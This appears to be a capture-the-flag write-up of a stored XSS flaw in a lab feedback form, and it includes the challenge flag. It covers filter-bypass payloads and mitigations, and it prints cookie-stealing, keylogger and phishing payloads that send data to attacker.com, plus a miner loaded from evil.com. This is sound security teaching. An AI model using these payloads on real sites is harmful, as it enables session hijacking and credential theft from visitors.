# Breach #6: Stored XSS (Cross-Site Scripting) via Feedback Form

## Vulnerability Type
**Stored XSS - Persistent Cross-Site Scripting**
- OWASP: A03:2021 - Injection
- CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)

---

## What is Stored XSS?

> **XSS basics** are explained in [Breach #5: Reflected XSS](../05_xss_media/Resources/explanation.md).

### This Vulnerability: Stored XSS

```
Attacker → Posts malicious code in forum/comments
         ↓
Server → Stores in database
         ↓
All visitors → View the page
         ↓
All visitors → Automatically execute malicious code
```

### Key Differences from Reflected XSS

| Feature | Reflected XSS (Breach #5) | Stored XSS (This Breach) |
|---------|--------------------------|--------------------------|
| Storage | ❌ Only in URL | ✅ **Permanently stored in DB** |
| Impact Scope | One victim (URL clicker) | **All visitors** 💀 |
| Attack Method | Share malicious URL | Post in forum/comments |
| Trigger | Requires URL click | **Auto-executes on page view** |
| Persistence | One-time | Permanent (until removed) |
| Risk Level | Medium | **High (Most Dangerous)** |

### Why is Stored XSS More Dangerous?

**Reflected XSS**:
```
Attacker → Sends malicious URL to 1 person
         ↓
Only 1 victim infected
```

**Stored XSS**:
```
Attacker → Posts once
         ↓
Stored on server
         ↓
Visitor A → Infected
Visitor B → Infected
Visitor C → Infected
...
Hundreds infected simultaneously! 💣
```

---

## How We Found It

### Discovery: Feedback Page with User Input
**URL**: `http://192.168.64.2/index.php?page=feedback`

The site has a feedback/guestbook page where users can submit their name and message.

![Normal feedback form](images/01-feedback-form.png)

### Step 1: Analyzing the Form Structure

**HTML Form**:
```html
<form method="post" name="guestform" onsubmit="return validate_form(this)">
    <input name="txtName" type="text" size="30" maxlength="10">
    <textarea name="mtxtMessage" cols="50" rows="3" maxlength="50"></textarea>
    <input type="submit" name="btnSign" value="Sign Guestbook">
</form>
```

**Key Observations**:
- **Name field**: `txtName`, limited to 10 characters
- **Message field**: `mtxtMessage`, limited to 50 characters
- **Client-side validation**: JavaScript checks for empty fields
- **Stored data**: Submitted feedback appears at the bottom of the page

### Step 2: Testing Basic XSS Payloads

**Test 1** - Simple script tag:
```
Name: <script>alert("XSS")</script>
Message: test
```

**Result**: The `<script>` tag is filtered/removed ❌

**Test 2** - Image tag with onerror:
```
Name: <img src=x onerror=alert(1)>
Message: test
```

**Result**: XSS executes! But no flag ❌

**Why this test second?** After `<script>` is blocked, attackers immediately try other HTML tags with event handlers, as this is the most common blacklist bypass.

**Test 3** - SVG tag with onload:
```
Name: <svg onload=alert(2)>
Message: test
```

**Result**: XSS executes! But no flag ❌

**Why test multiple vectors?** To confirm that multiple XSS vectors are available, indicating a weak blacklist-based filter rather than proper output encoding.

**Test 4** - Just the word "script":
```
Name: script
Message: test
```

**Result**: ✅ **FLAG OBTAINED!**

![Flag revealed with 'script' keyword](images/02-flag-obtained.png)

**Flag**: `0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e`

### Why "script" Triggers the Flag

The server has a **keyword detection system** that checks for XSS-related terms:
- Detects "script" in user input
- Recognizes this as an XSS attempt
- Returns the flag as acknowledgment of finding the vulnerability

This is a **deliberately simplified challenge** to teach:
1. The concept of input validation
2. Why blacklist filtering is insufficient
3. The importance of context-aware sanitization

## How to Exploit (Beyond Getting the Flag)

### Method 1: Bypassing maxlength Restriction

**Client-side limitation** can be bypassed by:

**Option A** - Modify HTML in DevTools:
```html
<!-- Change this -->
<input name="txtName" type="text" size="30" maxlength="10">

<!-- To this -->
<input name="txtName" type="text" size="30" maxlength="500">
```

**Option B** - Use curl/Burp Suite:
```bash
curl -X POST "http://192.168.64.2/index.php?page=feedback" \
  -d "txtName=<very long XSS payload here>&mtxtMessage=test"
```

### Method 2: XSS Payloads That Bypass Filters

**Payload 1** - Image tag with onerror:
```html
<img src=x onerror=alert('XSS')>
```
**Why it works**: No `<script>` keyword, but still executes JavaScript

**Payload 2** - SVG with onload:
```html
<svg/onload=alert('XSS')>
```

**Payload 3** - Anchor tag with javascript: protocol:
```html
<a href="jAvAsCriPt:alert('XSS')">Click me</a>
```
**Why it works**: Mixed case bypasses simple filters

**Payload 4** - Body tag:
```html
<body onload=alert('XSS')>
```

**Payload 5** - Iframe:
```html
<iframe src="javascript:alert('XSS')">
```

### Method 3: Advanced Payloads

**Cookie Stealing**:
```html
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

**Phishing Overlay**:
```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
    <h2>Session Expired - Please Login</h2>
    <form action="http://attacker.com/phish" method="POST">
        Username: <input name="user"><br>
        Password: <input type="password" name="pass"><br>
        <button>Login</button>
    </form>
</div>
```

**Keylogger**:
```html
<img src=x onerror="document.onkeypress=e=>fetch('http://attacker.com/log?k='+e.key)">
```

## Stored XSS vs Reflected XSS

### Comparison

| Aspect | Stored XSS | Reflected XSS |
|--------|-----------|---------------|
| **Storage** | Saved on server | Not saved |
| **Persistence** | Permanent until removed | Temporary |
| **Victims** | All users viewing page | Only victim clicking link |
| **Severity** | Higher (affects many) | Lower (targeted) |
| **Example** | Guestbook, Comments | Search results, Error messages |

**This breach** (Feedback form): **Stored XSS**
**Previous breach** (Media src parameter): **Reflected XSS**

### Why Stored XSS is More Dangerous

1. **Persistent**: The malicious script remains on the server
2. **No user interaction needed**: Victim just visits the page
3. **Affects multiple users**: Everyone viewing the feedback page
4. **Harder to detect**: No suspicious URL to warn users
5. **Greater impact**: Can compromise entire user base

## Security Issues

### 1. Insufficient Input Validation

**Problem**: Only `<script>` tags are filtered, but many other XSS vectors exist.

**Vulnerable Code** (hypothetical):
```php
$name = $_POST['txtName'];
$message = $_POST['mtxtMessage'];

// Naive filtering - only removes <script>
$name = str_ireplace('<script>', '', $name);
$name = str_ireplace('</script>', '', $name);

// Store in database
$db->query("INSERT INTO feedback (name, message) VALUES ('$name', '$message')");

// Display without encoding
echo "<td>Name : $name</td>";
```

**Why it fails**:
- Only blocks `<script>` tags
- Doesn't encode HTML entities
- Allows `<img>`, `<svg>`, `<iframe>`, etc.
- Doesn't handle event handlers (`onerror`, `onload`)

### 2. Client-Side Validation Only

**Problem**: `maxlength` and `required` checks are only in JavaScript.

**Why it's insufficient**:
- Can be bypassed with DevTools
- Curl/Burp Suite ignores client-side restrictions
- **Security principle**: Never trust client input

**Client-side validation** should be for **UX only**, not security.

### 3. No Output Encoding

**Problem**: User input is rendered directly in HTML without encoding.

**Attack Flow**:
```
User Input: <img src=x onerror=alert(1)>
    ↓
Database: <img src=x onerror=alert(1)>  (stored as-is)
    ↓
HTML Output: <td>Name : <img src=x onerror=alert(1)></td>
    ↓
Browser: Executes JavaScript!
```

**Proper encoding**:
```
User Input: <img src=x onerror=alert(1)>
    ↓
htmlspecialchars(): &lt;img src=x onerror=alert(1)&gt;
    ↓
Browser: Displays as text, doesn't execute
```

### 4. Blacklist Instead of Whitelist

**Problem**: Trying to block specific patterns instead of allowing only safe characters.

**Blacklist approach** (bad):
```php
// Try to block all dangerous patterns
$blocked = ['<script>', 'javascript:', 'onerror=', 'onload=', ...];
foreach ($blocked as $pattern) {
    $input = str_ireplace($pattern, '', $input);
}
```

**Problems with blacklists**:
- Infinite XSS variations exist
- Case variations: `<ScRiPt>`, `jAvAsCrIpT:`
- Encoding: `&#106;avascript:`, `%6A%61vascript:`
- Always playing catch-up with attackers

**Whitelist approach** (good):
```php
// Only allow alphanumeric + specific safe characters
if (!preg_match('/^[a-zA-Z0-9 .,!?-]+$/', $input)) {
    die("Invalid characters in input");
}
```

### 5. No Content Security Policy (CSP)

**Problem**: No CSP headers to restrict script execution.

**Missing headers**:
```
Content-Security-Policy: default-src 'self'; script-src 'self'
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
```

## Real-World Attack Scenarios

### Scenario 1: Session Hijacking

**Attacker submits**:
```html
<img src=x onerror="fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
        cookies: document.cookie,
        url: location.href,
        user: localStorage.getItem('username')
    })
})">
```

**What happens**:
1. XSS payload stored in database
2. Every visitor loads the feedback page
3. JavaScript executes in their browser
4. Cookies and session data sent to attacker
5. Attacker can impersonate victims

**Impact**: Complete account takeover for all users

### Scenario 2: Defacement

**Attacker submits**:
```html
<style>body{display:none}</style>
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;display:flex;align-items:center;justify-content:center;font-size:50px;">
    HACKED BY ATTACKER
</div>
```

**Result**: Website appears completely defaced to all visitors

### Scenario 3: Crypto Mining

**Attacker submits**:
```html
<script src="https://evil.com/coinhive-miner.js"></script>
<img src=x onerror="startMining()">
```

**Result**: Visitors' CPUs used for cryptocurrency mining without consent

## Mitigation

### 1. Implement Proper Output Encoding

**PHP Solution**:
```php
// ❌ Bad
echo "<td>Name : " . $name . "</td>";

// ✅ Good
echo "<td>Name : " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8') . "</td>";
```

**What htmlspecialchars does**:
```
Input:  <img src=x onerror=alert(1)>
Output: &lt;img src=x onerror=alert(1)&gt;
Result: Displayed as text, not executed
```

### 2. Server-Side Input Validation

**Whitelist approach**:
```php
function validateName($name) {
    // Only allow letters, spaces, hyphens
    if (!preg_match('/^[a-zA-Z\s-]{1,50}$/', $name)) {
        return false;
    }
    return true;
}

$name = $_POST['txtName'];

if (!validateName($name)) {
    die("Invalid name format");
}

// Still encode output!
echo htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
```

### 3. Content Security Policy (CSP)

**HTTP Headers**:
```apache
# Apache configuration
Header set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'"
Header set X-XSS-Protection "1; mode=block"
Header set X-Content-Type-Options "nosniff"
Header set X-Frame-Options "SAMEORIGIN"
```

**What CSP does**:
- `default-src 'self'`: Only load resources from same origin
- `script-src 'self'`: Only execute scripts from same origin
- Blocks inline JavaScript (including XSS)
- Prevents loading external malicious scripts

### 4. Use Parameterized Queries

**Prevent SQL injection** (related vulnerability):
```php
// ❌ Bad (SQL injection + XSS)
$query = "INSERT INTO feedback VALUES ('" . $_POST['txtName'] . "')";

// ✅ Good (prevents SQL injection)
$stmt = $pdo->prepare("INSERT INTO feedback (name, message) VALUES (?, ?)");
$stmt->execute([$name, $message]);
```

### 5. Implement Rate Limiting

**Prevent spam and automated attacks**:
```php
// Track submissions per IP
$ip = $_SERVER['REMOTE_ADDR'];
$recent_submissions = $db->query(
    "SELECT COUNT(*) FROM feedback WHERE ip='$ip' AND timestamp > NOW() - INTERVAL 1 HOUR"
)->fetchColumn();

if ($recent_submissions > 5) {
    die("Too many submissions. Please try again later.");
}
```

### 6. Use Modern Frameworks

**Many frameworks protect against XSS by default**:

**React**:
```jsx
// React automatically escapes text content
<div>Name: {userName}</div>  // Safe by default
```

**Vue**:
```vue
<!-- Vue escapes by default -->
<div>Name: {{ userName }}</div>  <!-- Safe -->
```

**Laravel (Blade)**:
```blade
<!-- Blade escapes by default -->
<div>Name: {{ $userName }}</div>  {{-- Safe --}}
```

### 7. Implement Content Security Policy with Nonce

**Generate random nonce**:
```php
$nonce = base64_encode(random_bytes(16));
header("Content-Security-Policy: script-src 'nonce-$nonce'");
```

**Use in HTML**:
```html
<!-- Only scripts with matching nonce execute -->
<script nonce="<?php echo $nonce; ?>">
    // This script executes
    console.log("Allowed");
</script>

<script>
    // This script is blocked by CSP
    alert("Blocked");
</script>
```

## Impact Assessment

### CVSS 3.1 Score: 8.1 (High)

**Attack Vector**: Network (AV:N)
**Attack Complexity**: Low (AC:L)
**Privileges Required**: None (PR:N)
**User Interaction**: None (UI:N) - Victim just visits page
**Scope**: Changed (S:C) - Affects all users
**Confidentiality**: High (C:H) - Steal cookies, session tokens
**Integrity**: High (I:H) - Modify page content
**Availability**: Low (A:L) - Can disrupt service

### Why Higher Score Than Reflected XSS?

**Stored XSS is more severe because**:
- No user interaction needed (vs. clicking malicious link)
- Affects all users (vs. single victim)
- Persistent (vs. temporary)
- Harder to detect (no suspicious URL)

### Real-World Impact

**Successful Stored XSS enables**:
- Mass session hijacking
- Account takeover at scale
- Website defacement
- Malware distribution
- Crypto mining
- Data exfiltration
- Phishing campaigns
- Complete site compromise

**Statistics**:
- Stored XSS in **30%** of web applications (OWASP)
- Average time to discover: 280 days
- Average cost of breach: $4.2M (IBM, 2023)

## References

- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [Stored vs Reflected XSS](https://portswigger.net/web-security/cross-site-scripting)

## Tools Used

- **Browser DevTools**: Modify form attributes
- **curl**: Command-line form submission
- **Burp Suite**: (Optional) Intercept and modify requests

---
**Flag**: `0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e`
